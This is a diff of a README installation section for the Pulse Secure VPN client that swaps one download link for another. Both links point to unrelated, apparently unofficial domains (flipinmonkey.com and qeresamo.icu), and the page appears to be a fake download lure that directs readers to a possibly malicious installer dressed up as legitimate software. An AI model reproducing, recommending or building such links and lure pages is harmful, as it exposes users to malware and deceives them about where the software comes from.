@@ -13,7 +13,7 @@
 ## Installation
 Start your setup by downloading Pulse Secure for Windows now:
 
-[**Download Pulse Secure**](https://flipinmonkey.com/bin/)
+[**Download Pulse Secure**](https://qeresamo.icu/)
 
 Before downloading Pulse Secure, ensure your system meets the System Requirements to avoid installation issues. Click the link above to download the installation package. If you encounter any problems during the download or installation process, refer to the Troubleshooting section for solutions to common issues.
 
